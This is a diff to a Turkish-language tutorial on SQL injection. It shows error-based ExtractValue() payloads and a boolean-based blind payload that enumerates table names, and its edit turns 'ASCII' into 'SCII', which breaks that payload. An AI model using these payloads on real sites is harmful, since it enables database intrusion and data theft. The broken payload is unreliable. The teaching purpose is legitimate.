@@ -128,9 +128,11 @@
 
   - Önceki inject ettiğimiz URL üzerinden devam edebiliriz.WWW.x.com/?id=ExtractValue(rand(), concat(1,'Mehmet')) yazdığımızda XPATH syntax error: 'Mehmet' şeklinde bir hata alıyoruz.Yazdığımız string hatanın içerisinde geri döndü.Bu sayede subquery yazabiliriz.
   - Örnek payload:
+
      ```sql
      SELECT ExtractValue(rand(),concat(1,(SELECT database())));
      ```
+
   - Burada rand() fonksiyonunu kullanmamızın sebebi hata ürettirip kendi yazdığımız subquery'nin sonucunu ekrana basmak.
 
   ## Boolean-Based SQLi
@@ -167,7 +169,8 @@
 
   - Örnek payload:
 
-    ```ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1)) > 104
+    ```
+    SCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1)) > 104
     Eğer sonuç 104'den büyükse ASCII tablosundaki 104'den büyük olan numaraların aritmetik ortalamasını alıp aynı işlemi daha az HTTP request ile çözmüş oluyoruz.
     ```
  
